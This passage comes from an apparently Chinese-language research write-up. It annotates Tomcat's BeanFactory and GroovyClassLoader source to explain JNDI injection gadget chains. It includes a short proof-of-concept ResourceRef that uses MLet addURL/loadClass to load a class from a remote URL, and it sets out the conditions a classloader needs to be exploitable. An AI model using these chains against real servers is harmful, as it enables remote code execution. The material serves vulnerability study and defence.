                            //paramTypes为String类型
                            Class[] paramTypes = new Class[]{String.class};
                            String[] var18 = value.split(",");
                            i = var18.length;
                            for(int var20 = 0; var20 = 0) {
                                    propName = param.substring(index + 1).trim();
                                    param = param.substring(0, index).trim();
                                } else {
                                    propName = "set" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1);
                                }
                            //通过propName和paramTypes获取Method并放到param中
                                try {
                                    forced.put( , beanClass.getMethod(propName, paramTypes));
                                } catch (SecurityException | NoSuchMethodException var24) {
                                    throw new NamingException("Forced String setter " + propName + " not found for property " + param);
                                }
                            }
                        }
  * 下面获取引用对象中保存的所有属性，通过while循环遍历属性内容并赋值给valueArray作为参数最终通过invoke完成反射调用。这里需要注意的是 **反射调用是在while循环中的，所以可以调用多个方法** 。
    //从引用对象中获取所有的属性
                  Enumeration e = ref.getAll();
            //遍历属性
    while(true) {
                            while(true) {
                                do {
                                    do {
                                        do {
                                            do {
                                                do {
                                                    if (!e.hasMoreElements()) {
                                                        return bean;
                                                    }
        ·                                           //获取属性
                                                    ra = (RefAddr)e.nextElement();
                                                    //获取propName
                                                    propName = ra.getType();
                           //如果propName是下面的值则跳过
                                                } while(propName.equals("factory"));
                                            } while(propName.equals("scope"));
                                        } while(propName.equals("auth"));
                                    } while(propName.equals("forceString"));
                                } while(propName.equals("singleton"));
                            //获取属性中的内容
                                value = (String)ra.getContent();
                                Object[] valueArray = new Object[1];
                                //根据propName从map中获取method
                                Method method = (Method)forced.get(propName);
                                if (method != null) {
                                    //将属性中的内容赋给valueArray
                                    valueArray[0] = value;
                                    try {
                                    //反射调用方法
                                        method.invoke(bean, valueArray);
                                    } catch (IllegalArgumentException | InvocationTargetException | IllegalAccessException var23) {
                                        throw new NamingException("Forced String setter " + method.getName() + " threw exception for property " + propName);
                                    }
                                }
所以通过上面的分析发现其实在`BeanFactory`中其实可以调用多个方法，但是这些方法必须都在同一个Class中。并且  
**由于在这个过程中Class只被实例化了一次，因此可以通过调用不同的方法为Class的属性赋值** 。
下来再看这个poc就可以理解为什么可以这么构造了。
    ResourceRef ref = new ResourceRef("javax.management.loading.MLet", null, "", "",
                    true, "org.apache.naming.factory.BeanFactory", null);
                //指定要调用的方法名
                ref.add(new StringRefAddr("forceString", "b=addURL,c=loadClass"));
                //为不同的方法的参数赋值
                ref.add(new StringRefAddr("b", "http://127.0.0.1:2333/"));
                ref.add(new StringRefAddr("c", "Blue"));
                return ref;
## 失败的UrlClassLoader调用链挖掘尝试
通过`Mlet`的加载虽然不能利用，但是我们也可以学习到`浅蓝`师傅挖掘调用链的思路，即通过UrlClassLoader的实现类寻找可以加载远程类的代码。
我们也可以尝试去挖掘对UrlClassLoader的调用，相关的调用需要满足以下条件：
  * 存在public构造方法
  * 继承UrlClassLoader并调用了loadClass方法
`WebappClassLoaderBase`似乎满足条件，虽然这个类本身没有public构造方法，但是其子类`WebappClassLoader`是有无参构造方法的。但是由于`WebappClassLoaderBase`的`addURL`方法不是public类型的，所以无法利用。
`org.codehaus.plexus.compiler.javac.IsolatedClassLoader`满足上面的条件，但是addURL方法的参数不是String类型，所以也无法利用。
    public class IsolatedClassLoader extends URLClassLoader {
        private ClassLoader parentClassLoader = ClassLoader.getSystemClassLoader();
        public IsolatedClassLoader() {
            super(new URL[0], (ClassLoader)null);
        }
        public void addURL(URL url) {
            super.addURL(url);
        }
        public synchronized Class loadClass(String className) throws ClassNotFoundException {
            Class c = this.findLoadedClass(className);
            ClassNotFoundException ex = null;
            if (c == null) {
                try {
                    c = this.findClass(className);
                } catch (ClassNotFoundException var5) {
                    ex = var5;
                    if (this.parentClassLoader != null) {
                        c = this.parentClassLoader.loadClass(className);
                    }
                }
            }
            if (c == null) {
                throw ex;
            } else {
                return c;
            }
        }
    }
所以似乎没有其他可以直接利用的ClassLoader了。
## GroovyClassLoader执行命令分析
那么为什么`GroovyClassLoader`可以加载远程的class并执行里面的内容呢？
首先在`addClasspath`中会将我们传入的path转换为URI并添加到当前的`GroovyClassLoader`对象中。
    public void addClasspath(final String path) {
            AccessController.doPrivileged(new PrivilegedAction() {
                public Void run() {
                    try {
                        URI newURI;
                       //正则匹配\p{Alpha}[-+.\p{Alnum}]*:[^\\]*,如果我们传入的是http的url是不会被匹配到的
                        if (!GroovyClassLoader.URI_PATTERN.matcher(path).matches()) {
                            newURI = (new File(path)).toURI();
                        } else {
                         //根据传入的path构建url对象
                            newURI = new URI(path);
                        }
                        //获取GroovyClassLoader中保存的url
                        URL[] urls = GroovyClassLoader.this.getURLs();
                        URL[] arr$ = urls;
                        int len$ = urls.length;
                        //判断newURI是否在url列表中
                        for(int i$ = 0; i$ < len$; ++i$) {
                            URL url = arr$[i$];
                            if (newURI.equals(url.toURI())) {
                                return null;
                            }
                        }
                    //将url添加到GroovyClassLoader对象中
                        GroovyClassLoader.this.addURL(newURI.toURL());
                    } catch (MalformedURLException var7) {
                    } catch (URISyntaxException var8) {
                    }
                    return null;
                }
            });
        }
`GroovyClassLoader#loadClass`首先通过UrlClassLoader根据我们传入的名称加载远程的Class，加载失败后则根据名称加载groovy，加载成功后会对远程加载的groovy代码编译。
    public Class loadClass(String name, boolean lookupScriptFiles, boolean preferClassOverScript, boolean resolve) throws ClassNotFoundException, CompilationFailedException {
            Class cls = this.getClassCacheEntry(name);
            boolean recompile = this.isRecompilable(cls);
            if (!recompile) {
                return cls;
            } else {
                ClassNotFoundException last = null;
                try {
                    //首先通过UrlClassLoader加载类加载成功则返回，失败则继续执行
                    Class parentClassLoaderClass = super.loadClass(name, resolve);
                    if (cls != parentClassLoaderClass) {
                        return parentClassLoaderClass;
                    }
                } catch (ClassNotFoundException var19) {
                    last = var19;
                } catch (NoClassDefFoundError var20) {
                    if (var20.getMessage().indexOf("wrong name") <= 0) {
                        throw var20;
                    }
                    last = new ClassNotFoundException(name);
                }
                SecurityManager sm = System.getSecurityManager();
                if (sm != null) {
                    String className = name.replace('/', '.');
                    int i = className.lastIndexOf(46);
                    if (i != -1 && !className.startsWith("sun.reflect.")) {
                        sm.checkPackageAccess(className.substring(0, i));
                    }
                }
                if (cls != null && preferClassOverScript) {
                    return cls;
                } else {
                    if (lookupScriptFiles) {
                        try {
                            //从缓存中先获取Class
                            Class classCacheEntry = this.getClassCacheEntry(name);
                            if (classCacheEntry != cls) {
                                Class var24 = classCacheEntry;
                                return var24;
                            }
                    //根据名称获取远程groovy的url
                            URL source = this.resourceLoader.loadGroovySource(name);
                            Class oldClass = cls;
                            cls = null;
                      //编译groovy代码
                            cls = this.recompile(source, name, oldClass);
                        } catch (IOException var17) {
    ....
            }
        }
在`recompile`中判断URL是否是文件类型，如果不是则加载远程url中指定的groovy并进行parse。
    protected Class recompile(URL source, String className, Class oldClass) throws CompilationFailedException, IOException {
            if (source == null || (oldClass == null || !this.isSourceNewer(source, oldClass)) && oldClass != null) {
                return oldClass;